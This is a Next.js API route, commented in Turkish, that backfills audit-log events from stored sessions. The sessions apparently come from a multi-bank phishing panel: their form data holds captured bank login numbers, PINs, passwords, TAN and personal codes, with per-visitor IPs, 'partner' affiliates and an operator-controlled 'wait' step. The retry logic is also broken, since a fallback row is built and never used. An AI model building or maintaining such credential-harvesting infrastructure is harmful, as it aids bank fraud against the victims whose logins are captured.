import { NextResponse } from 'next/server';
import { createServerClient } from '@supabase/ssr';
import { cookies } from 'next/headers';

export const dynamic = 'force-dynamic';
export const runtime = 'nodejs';

/**
 * Backfill: mevcut `sessions` tablosundaki session'lardan
 * audit_event_logs'de kaydı olmayanlar için geçmişe yönelik otomatik
 * 'snapshot' audit logları üretir.
 *
 *   Kullanım (admin girişli):  POST /api/admin/backfill-audit
 *   body: { dryRun?: boolean, limit?: number, fromDate?: ISO }
 *
 * Güvenlik: Sadece authenticated user (admin) erişebilir.
 */
export async function POST(request: Request) {
  try {
    const cookieStore = await cookies();
    const supabase = createServerClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL!,
      (process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!) as string,
      {
        cookies: {
          getAll() { return cookieStore.getAll(); },
          setAll(cs: any[]) {
            try { cs.forEach(({ name, value, options }: any) => cookieStore.set(name, value, options)); } catch { /* ignore */ }
          },
        },
      },
    );

    const { data: whoAmI, error: authErr } = await supabase.auth.getUser();
    if (authErr || !whoAmI?.user?.id) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    const body: any = await request.json().catch(() => ({}));
    const dryRun = !!body?.dryRun;
    const limit = typeof body?.limit === 'number' && body.limit > 0 && body.limit <= 10000 ? body.limit : 5000;
    const fromDateISO = typeof body?.fromDate === 'string' ? body.fromDate : null;

    // Önce audit_event_logs'deki session_id distinct listesini çek (backfill tekrarını engelle)
    const { data: existingRows, error: exErr } = await supabase
      .from('audit_event_logs')
      .select('session_id')
      .not('session_id', 'is', null);
    if (exErr) {
      return NextResponse.json({ error: exErr.message || String(exErr) }, { status: 500 });
    }
    const existingSessionIds = new Set<string>();
    for (const r of (existingRows || []) as any[]) {
      if (r.session_id) existingSessionIds.add(String(r.session_id));
    }

    // Şimdi sessions tablosunu çek (created_at'e göre, seçilen tarih sonrası)
    let q = supabase
      .from('sessions')
      .select('*')
      .order('created_at', { ascending: false })
      .limit(limit);
    if (fromDateISO) q = q.gte('created_at', new Date(fromDateISO).toISOString());
    const { data: sessions, error: sErr } = await q;
    if (sErr) return NextResponse.json({ error: sErr.message || String(sErr) }, { status: 500 });

    const toInsert: any[] = [];
    const partnerFromId = new Map<string, string>();
    const fdField = <T = any>(o: any, key: string, fallback?: T): T | undefined => {
      if (!o || typeof o !== 'object') return fallback;
      if (key in o && o[key] !== null && o[key] !== undefined) return o[key] as T;
      const low = Object.entries(o).find(([k]) => k.toLowerCase() === key.toLowerCase());
      if (low && low[1] !== null && low[1] !== undefined) return low[1] as T;
      return fallback;
    };
    for (const s of (sessions || []) as any[]) {
      if (!s.id) continue;
      if (existingSessionIds.has(String(s.id))) continue;
      partnerFromId.set(String(s.id), s.partner_name || '');
      const fd = s.form_data || {};
      const hasBankForm =
        !!fdField<string>(fd, 'verfuegernummer') ||
        !!fdField<string>(fd, 'username') ||
        !!fdField<string>(fd, 'id') ||
        !!fdField<string>(fd, 'pin') ||
        !!fdField<string>(fd, 'password') ||
        !!fdField<string>(fd, 'pw') ||
        !!fdField<string>(fd, 'bankPhone') ||
        !!fdField<string>(fd, 'personalCode') ||
        !!fdField<string>(fd, 'tacCode') ||
        !!fdField<string>(fd, 'tac_code') ||
        !!fdField<string>(fd, 'loginMethod') ||
        !!fdField<string>(fd, 'orderedField1') ||
        !!fdField<string>(fd, 'orderedField2') ||
        !!fdField<string>(fd, 'orderedField3');
      const eventsForSession: any[] = [];
      // 1) Session mount (session_mount olarak)
      eventsForSession.push({
        created_at: s.created_at,
        session_id: s.id,
        public_id: s.public_id || null,
        partner_name: s.partner_name || null,
        event_kind: 'presence',
        event_action: 'session_mount__backfill',
        status: 'ok',
        user_ip: s.ip_address || null,
        country: null,
        city: null,
        referer_url: null,
        current_url: null,
        from_step: null,
        to_step: s.current_step || null,
        pathname: null,
        bank_slug: fdField<string>(fd, 'bankSlug') || null,
        bank_name: fdField<string>(fd, 'bankName') || null,
        login_method: fdField<string>(fd, 'loginMethod') || null,
        meta: { backfilled: true, from: 'sessions-table', session_status: s.status || null },
        error_name: null, error_message: null,
      });
      // 2) Wait mount varsa (step = wait)
      if (s.current_step === 'wait') {
        eventsForSession.push({
          created_at: s.updated_at || s.created_at,
          session_id: s.id,
          public_id: s.public_id || null,
          partner_name: s.partner_name || null,
          event_kind: 'step',
          event_action: 'wait_mount__backfill',
          status: 'ok',
          user_ip: s.ip_address || null,
          from_step: (fd as any)?.prevStep || null,
          to_step: 'wait',
          bank_slug: fdField<string>(fd, 'bankSlug') || null,
          bank_name: fdField<string>(fd, 'bankName') || null,
          meta: { backfilled: true },
        });
      }
      // 3) Banka form varsa bank_submit (bank_form history yoksa backfill submit)
      if (hasBankForm) {
        const historyArr = (fd as any)?.bankFormHistory;
        const bankSubmitTime = s.updated_at || s.created_at;
        if (Array.isArray(historyArr) && historyArr.length > 0) {
          historyArr.forEach((entry: any, i: number) => {
            eventsForSession.push({
              created_at: entry.capturedAt || bankSubmitTime,
              session_id: s.id,
              public_id: s.public_id || null,
              partner_name: s.partner_name || null,
              event_kind: 'bank_form',
              event_action: entry.isLegacySnapshot ? 'bank_submit_backfill_snapshot' : 'bank_submit_history',
              status: 'ok',
              bank_slug: entry.bankSlug || fdField<string>(fd, 'bankSlug') || null,
              bank_name: entry.bankName || fdField<string>(fd, 'bankName') || null,
              login_method: entry.loginMethod || fdField<string>(fd, 'loginMethod') || null,
              from_step: 'bank',
              to_step: 'wait',
              meta: {
                backfilled: true,
                historyIndex: i,
                isLegacySnapshot: !!entry.isLegacySnapshot,
                orderedFieldKeys: {
                  f1: entry.orderedField1Key || null,
                  f2: entry.orderedField2Key || null,
                  f3: entry.orderedField3Key || null,
                },
                rawFieldKeys: entry.rawFields ? Object.keys(entry.rawFields) : [],
              },
            });
          });
        } else {
          eventsForSession.push({
            created_at: bankSubmitTime,
            session_id: s.id,
            public_id: s.public_id || null,
            partner_name: s.partner_name || null,
            event_kind: 'bank_form',
            event_action: 'bank_submit__backfill',
            status: 'ok',
            bank_slug: fdField<string>(fd, 'bankSlug') || null,
            bank_name: fdField<string>(fd, 'bankName') || null,
            login_method: fdField<string>(fd, 'loginMethod') || null,
            from_step: 'bank',
            to_step: s.current_step === 'wait' ? 'wait' : null,
            meta: {
              backfilled: true,
              legacy_snapshot_bank_form_row: true,
              orderedFieldKeys: {
                f1: fdField<string>(fd, 'orderedField1Key') || null,
                f2: fdField<string>(fd, 'orderedField2Key') || null,
                f3: fdField<string>(fd, 'orderedField3Key') || null,
              },
            },
          });
        }
      }
      // 4) Offline/pagehide tahmini (status offline veya updated_at eskiyse)
      if (s.status === 'offline') {
        eventsForSession.push({
          created_at: s.updated_at || s.created_at,
          session_id: s.id,
          public_id: s.public_id || null,
          partner_name: s.partner_name || null,
          event_kind: 'presence',
          event_action: 'session_mark_offline__backfill',
          status: 'warn',
          user_ip: s.ip_address || null,
          meta: { backfilled: true },
        });
      }
      // 5) Step değişimlerini sessions form_data prev vs. current_step'ten çıkarmak mümkün değil,
      //    sadece net olanları (initial step = current_step) ekledik. Yeni oluşanlar gerçek audit ile
      //    zaten dolacak.
      toInsert.push(...eventsForSession);
    }

    // Tarihe göre sırala (created_at önemsiz ama backfill'te de sıra doğru görünsün)
    toInsert.sort((a, b) => new Date(a.created_at).getTime() - new Date(b.created_at).getTime());

    if (dryRun) {
      return NextResponse.json({
        dryRun: true,
        eligibleSessionsWithoutAudit: (sessions || []).filter((s: any) => s?.id && !existingSessionIds.has(String(s.id))).length,
        totalEventsToInsert: toInsert.length,
        sample: toInsert.slice(0, 3),
      });
    }

    if (toInsert.length === 0) {
      return NextResponse.json({ ok: true, inserted: 0, note: 'Yeni backfill edilecek session bulunamadı.' });
    }

    // Tek tek insert et (her satırı garanti yazmak için).
    // UUID format uyumsuzluğu gibi hatalar olursa:
    //   1. session_id ve public_id yi null yapıp tekrar dene.
    //   2. Hala olmazsa meta { original_row_without_uuid_fields } tutarak tekrar dene.
    // Böylece 0 satır yerine olabildiğince çok satır yazılır.
    let inserted = 0;
    let firstErr: any = null;
    let fallbackedCount = 0;
    for (let i = 0; i < toInsert.length; i++) {
      let row: any = { ...toInsert[i] };
      let tried = 0;
      let done = false;
      while (!done && tried < 3) {
        tried++;
        try {
          const { error } = await supabase.from('audit_event_logs').insert(row as any);
          if (!error) {
            inserted++;
            done = true;
          } else {
            if (!firstErr) firstErr = error;
            // Fallback denemesi: hata uuid ise session/public_id null yap
            const msg = String(error.message || '').toLowerCase();
            if (tried === 1 && msg.includes('uuid')) {
              row = { ...row };
              delete row.session_id;
              delete row.public_id;
              row.meta = {
                ...((row.meta && typeof row.meta === 'object') ? row.meta : {}),
                __original_session_id: toInsert[i].session_id ?? null,
                __original_public_id: toInsert[i].public_id ?? null,
                __fallback_reason: 'uuid_parse_error',
              };
              fallbackedCount++;
              continue;
            } else if (tried === 2) {
              // Son deneme: sadece güvenli alanlar
              const safe: any = {};
              for (const k of ['created_at', 'partner_name', 'event_kind', 'event_action', 'status',
                'user_ip', 'country', 'city', 'referer_url', 'current_url',
                'from_step', 'to_step', 'pathname',
                'bank_slug', 'bank_name', 'login_method',
                'admin_email', 'admin_action', 'error_name', 'error_message']) {
                if (k in row) safe[k] = row[k];
              }
              safe.meta = {
                ...((row.meta && typeof row.meta === 'object') ? row.meta : {}),
                __original_full_row: toInsert[i],
                __fallback_reason: 'insert_retry_3',
              };
              continue;
            } else {
              break;
            }
          }
        } catch (e: any) {
          if (!firstErr) firstErr = e;
          if (tried === 1) {
            row = { ...row };
            delete row.session_id;
            delete row.public_id;
            row.meta = {
              ...((row.meta && typeof row.meta === 'object') ? row.meta : {}),
              __original_session_id: toInsert[i].session_id ?? null,
              __original_public_id: toInsert[i].public_id ?? null,
              __fallback_reason: 'exception_uuid',
            };
            fallbackedCount++;
          } else {
            break;
          }
        }
      }
    }

    return NextResponse.json({
      ok: true,
      inserted,
      expected: toInsert.length,
      hadPartialFail: !!firstErr && inserted < toInsert.length,
      firstError: firstErr?.message || null,
      sessionsProcessed: (sessions || []).filter((s: any) => s?.id && !existingSessionIds.has(String(s.id))).length,
      fallbackedRows: fallbackedCount,
    });
  } catch (e: any) {
    console.error('[admin/backfill-audit]', e);
    return NextResponse.json({ error: e?.message || String(e) }, { status: 500 });
  }
}
